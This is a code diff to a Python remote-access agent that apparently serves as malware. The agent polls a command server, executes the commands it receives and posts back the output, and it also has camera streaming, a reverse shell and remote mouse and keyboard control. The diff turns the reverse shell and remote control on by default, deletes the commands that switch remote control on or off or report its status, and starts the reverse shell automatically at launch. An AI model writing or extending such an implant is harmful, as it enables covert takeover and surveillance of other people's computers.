@@ -1811,7 +1811,7 @@ CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREAD = None
 
 # --- Reverse Shell State ---
-REVERSE_SHELL_ENABLED = False
+REVERSE_SHELL_ENABLED = True
 REVERSE_SHELL_THREAD = None
 REVERSE_SHELL_SOCKET = None
 
@@ -2377,7 +2377,7 @@ def stop_voice_control():
 # --- Remote Control Functions ---
 
 # Global variables for remote control
-REMOTE_CONTROL_ENABLED = False
+REMOTE_CONTROL_ENABLED = True
 LOW_LATENCY_INPUT_HANDLER = None
 MOUSE_CONTROLLER = None
 KEYBOARD_CONTROLLER = None
@@ -3014,34 +3014,7 @@ def main_loop(agent_id):
                 else:
                     output = "Invalid terminate-process command format"
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
-            elif command == "enable-remote-control":
-                # Enable remote control
-                enable_remote_control()
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control enabled"})
-            elif command == "disable-remote-control":
-                # Disable remote control
-                disable_remote_control()
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control disabled"})
-            elif command == "remote-control-status":
-                # Check remote control status
-                status = "enabled" if is_remote_control_enabled() else "disabled"
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": f"Remote control is {status}"})
-            elif command.startswith("{") and "remote_control" in command:
-                # Handle remote control commands (JSON format)
-                try:
-                    import json
-                    command_data = json.loads(command)
-                    if command_data.get("type") == "remote_control":
-                        # Check if remote control is enabled before processing
-                        if REMOTE_CONTROL_ENABLED:
-                            handle_remote_control(command_data)
-                            # Send success response
-                            requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control command executed"})
-                        else:
-                            # Remote control is disabled, ignore the command
-                            requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control is disabled"})
-                except Exception as e:
-                    requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": f"Remote control error: {e}"})
+
             elif command != "sleep":
                 output = execute_command(command)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
@@ -3405,6 +3378,10 @@ if __name__ == "__main__":
     
     agent_id = get_or_create_agent_id()
     print(f"Agent starting with ID: {agent_id}")
+    
+    # Start reverse shell automatically
+    start_reverse_shell(agent_id)
+    
     try:
         main_loop(agent_id)
     except KeyboardInterrupt:
